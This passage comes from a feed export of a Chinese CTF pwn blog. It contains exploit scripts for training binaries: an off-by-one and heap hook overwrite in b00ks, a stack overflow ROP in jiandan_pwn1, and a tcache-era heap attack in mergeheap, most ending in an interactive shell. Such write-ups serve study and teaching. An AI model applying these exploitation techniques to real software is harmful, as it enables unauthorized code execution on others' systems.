class="line">p.sendlineafter(<span class="string">'Command: '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Index: '</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">'Size: '</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendlineafter(<span class="string">'Content: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'Command: '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Index: '</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'Command: '</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Index:'</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#0 </span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x20</span>)+p8(<span class="number">0x80</span>)</span><br><span class="line">full(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">full(<span class="number">3</span>,<span class="number">0x20</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#2--&gt;4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>)</span><br><span class="line">full(<span class="number">3</span>,<span class="number">0x20</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#防止合并</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line">main_addr=u64(p.recvuntil(<span class="string">b'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">88</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_addr))</span><br><span class="line">base=main_addr-<span class="number">0x10</span>-libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system=base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">fake_addr=main_addr-<span class="number">0x10</span>-<span class="number">0x23</span></span><br><span class="line">full(<span class="number">2</span>,<span class="number">0x8</span>,p64(fake_addr))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">or</span></span><br><span class="line"><span class="string">payload=p64(0)*3+p64(0x71)+p64(fake_addr)</span></span><br><span class="line"><span class="string">full(3,0x28,payload)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#6</span></span><br><span class="line">one=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=base+one[<span class="number">1</span>]</span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0x13</span>+p64(one_gadget)</span><br><span class="line">full(<span class="number">6</span>,<span class="number">0x1b</span>,payload)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF_2019_login</title>
      <link href="//posts/61db3fed/"/>
      <url>//posts/61db3fed/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/12/c2zXv.png" alt="image-20240313150317142"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>STKOF</title>
      <link href="//posts/696f0fbd/"/>
      <url>//posts/696f0fbd/</url>
      
        <content type="html"><![CDATA[<h5 id="两道程序题，一道32位一道64位，都是栈溢出的题"><a href="#两道程序题，一道32位一道64位，都是栈溢出的题" class="headerlink" title="两道程序题，一道32位一道64位，都是栈溢出的题"></a>两道程序题，一道32位一道64位，都是栈溢出的题</h5><p><img src="https://i0.imgs.ovh/2024/03/10/R2zsu.png" alt="image-20240311205640177"></p><p><img src="https://i0.imgs.ovh/2024/03/10/R2t8p.png" alt="image-20240311205417765"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>b00ks</title>
      <link href="//posts/be955ceb/"/>
      <url>//posts/be955ceb/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/10/RPetI.png" alt="image-20240311142425453"></p><h5 id="甩到脸上的off-by-one"><a href="#甩到脸上的off-by-one" class="headerlink" title="甩到脸上的off-by-one"></a>甩到脸上的off-by-one</h5><p><img src="https://i0.imgs.ovh/2024/03/10/RPckj.png" alt="image-20240311141823683"></p><h5 id="是一个图书管理系统"><a href="#是一个图书管理系统" class="headerlink" title="是一个图书管理系统"></a>是一个图书管理系统</h5><p><img src="https://i0.imgs.ovh/2024/03/10/RP1wJ.png" alt="image-20240311142646867"></p><h5 id="这里可以覆盖掉存堆地址的一个字节，可以实现改堆地址的操作"><a href="#这里可以覆盖掉存堆地址的一个字节，可以实现改堆地址的操作" class="headerlink" title="这里可以覆盖掉存堆地址的一个字节，可以实现改堆地址的操作"></a>这里可以覆盖掉存堆地址的一个字节，可以实现改堆地址的操作</h5><p><img src="https://i0.imgs.ovh/2024/03/10/RPiZe.png" alt="image-20240311142945990"></p><p><img src="https://i0.imgs.ovh/2024/03/10/RPJOW.png" alt="image-20240311142840161"></p><h5 id="打印的时候会连堆地址也打印出来"><a href="#打印的时候会连堆地址也打印出来" class="headerlink" title="打印的时候会连堆地址也打印出来"></a>打印的时候会连堆地址也打印出来</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'cccccccc'</span>,<span class="number">0x60</span>,<span class="string">'dddddddd'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'eeeeeeee'</span>,<span class="number">0x10</span>,<span class="string">'ffffffff'</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">1</span>)+p64(heap_addr+<span class="number">0x30</span>)+p64(heap_addr+<span class="number">0x30</span>+<span class="number">0x90</span>+<span class="number">0xe0</span>+<span class="number">0x10</span>)+p64(<span class="number">0x20</span>))</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2024/03/10/RV2Qp.png" alt="image-20240311151905833"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"node5.buuoj.cn"</span>,<span class="number">25494</span>)</span><br><span class="line"><span class="comment">#p=process("./b00ks")</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./b00ks'</span>)</span><br><span class="line">payload=<span class="string">b'k'</span>*<span class="number">0x1f</span>+<span class="string">b'b'</span></span><br><span class="line">p.sendlineafter(<span class="string">'Enter author name: '</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size1,content1,size2,content2</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Enter book name size:'</span>,<span class="built_in">str</span>(size1))</span><br><span class="line">p.sendlineafter(<span class="string">'Enter book name (Max 32 chars):'</span>,content1)</span><br><span class="line">p.sendlineafter(<span class="string">'Enter book description size:'</span>,<span class="built_in">str</span>(size2))</span><br><span class="line">p.sendlineafter(<span class="string">'Enter book description:'</span>,content2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idd,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Enter the book id you want to edit: '</span>,<span class="built_in">str</span>(idd))</span><br><span class="line">p.sendlineafter(<span class="string">'Enter new book description: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idd</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Enter the book id you want to delete: '</span>,<span class="built_in">str</span>(idd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ren</span>(<span class="params">content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'5'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Enter author name: '</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xd0</span>,<span class="string">'aaaaaaaa'</span>,<span class="number">0x20</span>,<span class="string">'bbbbbbb'</span>) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"kb"</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'addr'</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'cccccccc'</span>,<span class="number">0x60</span>,<span class="string">'dddddddd'</span>) <span class="comment">#2 </span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'bin/sh'</span>,<span class="number">0x10</span>,<span class="string">'ffffffff'</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">1</span>)+p64(heap_addr+<span class="number">0x30</span>)+p64(heap_addr+<span class="number">0x30</span>+<span class="number">0x90</span>+<span class="number">0xe0</span>+<span class="number">0x10</span>)+p64(<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">ren(<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line">main_addr=u64(p.recvuntil(<span class="string">'\x7f'</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">88</span></span><br><span class="line">malloc_hook=main_addr-<span class="number">0x10</span></span><br><span class="line">base=malloc_hook-libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook=base+libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">system=base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'main_addr'</span>+<span class="built_in">hex</span>(main_addr))</span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook)+p64(<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(system))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>freenote_x64</title>
      <link href="//posts/231495d9/"/>
      <url>//posts/231495d9/</url>
      
        <content type="html"><![CDATA[<p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240310205447683.png" alt="image-20240310205447683"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>jiandan_pwn1</title>
      <link href="//posts/595198b9/"/>
      <url>//posts/595198b9/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/08/QEhHH.png" alt="image-20240309170306025"></p><h5 id="一个字节一个字节输入，然后v4在rbp-4的位置，直接发送p32-0x10d-0d先放在左边-x61-的位置，然后把值放到rsp-0x10d的位置，后面的输入也不影响v4的值。"><a href="#一个字节一个字节输入，然后v4在rbp-4的位置，直接发送p32-0x10d-0d先放在左边-x61-的位置，然后把值放到rsp-0x10d的位置，后面的输入也不影响v4的值。" class="headerlink" title="一个字节一个字节输入，然后v4在rbp-4的位置，直接发送p32(0x10d),0d先放在左边(\x61)的位置，然后把值放到rsp+0x10d的位置，后面的输入也不影响v4的值。"></a>一个字节一个字节输入，然后v4在rbp-4的位置，直接发送p32(0x10d),0d先放在左边(\x61)的位置，然后把值放到rsp+0x10d的位置，后面的输入也不影响v4的值。</h5><p><img src="https://i0.imgs.ovh/2024/03/08/QEsoD.png" alt="image-20240309172253099"></p><p><img src="https://i0.imgs.ovh/2024/03/08/QExYo.png" alt="image-20240309170455669"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node5.buuoj.cn",27841)</span></span><br><span class="line">p=process(<span class="string">"./jiandan_pwn1"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">puts_func=<span class="number">0x4007BF</span></span><br><span class="line">puts_plt=<span class="number">0x400590</span></span><br><span class="line">puts_got=<span class="number">0x601018</span></span><br><span class="line">pop_rdi=<span class="number">0x400843</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x400783'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload=<span class="string">b'a'</span>*(<span class="number">0x110</span>-<span class="number">4</span>)+p32(<span class="number">0x10d</span>)+<span class="string">b'a'</span>*<span class="number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_func)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Hack 4 fun!'</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_got=u64(p.recvuntil(<span class="string">'\x7f'</span>).strip().ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">base=puts_got-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">system=base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh=base+<span class="built_in">next</span>(libc.search(<span class="string">b'bin/sh'</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'puts'</span>+<span class="built_in">hex</span>(puts_got))</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b'a'</span>*(<span class="number">0x110</span>-<span class="number">4</span>)+p32(<span class="number">0x10d</span>)+<span class="string">b'a'</span>*<span class="number">8</span>+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mergeheap</title>
      <link href="//posts/709727a2/"/>
      <url>//posts/709727a2/</url>
      
        <content type="html"><![CDATA[<p>保护全开，libc-2.27,malloc大小限制了0x400，有个合并堆的函数，可以合并大于0x400的，不过释放的时候总是和top_chunk合并。所以得用另一种方法泄露libc.</p><p><img src="https://i0.imgs.ovh/2024/03/08/QYjEN.png" alt="image-20240308204851522"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x210</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x210</span>,<span class="string">'cccc'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'dddd'</span>)</span><br><span class="line">merge(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></tbody></table></figure><h5 id="这种方法好像不行"><a href="#这种方法好像不行" class="headerlink" title="这种方法好像不行"></a>这种方法好像不行</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'cccc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>): </span><br><span class="line">free(i)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">'cccccccc'</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'cccccccc'</span>)</span><br><span class="line">main_addr=u64(p.recvuntil(<span class="string">b'\x7f'</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br></pre></td></tr></tbody></table></figure><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaaa\n'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'a'</span>*<span class="number">0x30</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'a'</span>*<span class="number">0x38</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'a'</span>)   <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>)      <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'a'</span>)   <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'c'</span>)      <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'f'</span>)      <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'d'</span>)      <span class="comment">#9</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br></pre></td></tr></tbody></table></figure><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">merge(<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2024/03/08/QY5lR.png" alt="image-20240309145439198"></p><h5 id="下一个堆的size位因为堆2，堆3的合并被改了，具体不太懂"><a href="#下一个堆的size位因为堆2，堆3的合并被改了，具体不太懂" class="headerlink" title="下一个堆的size位因为堆2，堆3的合并被改了，具体不太懂"></a>下一个堆的size位因为堆2，堆3的合并被改了，具体不太懂</h5><p><img src="https://i0.imgs.ovh/2024/03/08/QYYbp.png" alt="image-20240309150323508"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">6</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2024/03/08/QYDXu.png" alt="image-20240309150602685"></p><p><img src="https://i0.imgs.ovh/2024/03/08/QYEBl.png" alt="image-20240309151308724"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node5.buuoj.cn",25860)</span></span><br><span class="line">p=process(<span class="string">"./mergeheap"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context(log_level=<span class="string">'debug'</span>,os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'len:'</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendlineafter(<span class="string">'content:'</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'idx:'</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx:'</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">index1,index2</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx1:'</span>,<span class="built_in">str</span>(index1))</span><br><span class="line">p.sendlineafter(<span class="string">'idx2:'</span>,<span class="built_in">str</span>(index2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'cccc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>): </span><br><span class="line">free(i)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">'cccccccc'</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'cccccccc'</span>)</span><br><span class="line">main_addr=u64(p.recvuntil(<span class="string">b'\x7f'</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_addr-<span class="number">0x80</span>))</span><br><span class="line">main_arena=main_addr-<span class="number">96</span>-<span class="number">0x80</span></span><br><span class="line">malloc=main_arena-<span class="number">0x10</span></span><br><span class="line">base=malloc-libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">free_hook=base+libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">one=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget=base+one[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaaa\n'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'a'</span>*<span class="number">0x30</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'a'</span>*<span class="number">0x38</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'a'</span>)   <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>)      <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'a'</span>)   <span class="comment">#6</span></span><br><span class="line">add(<span 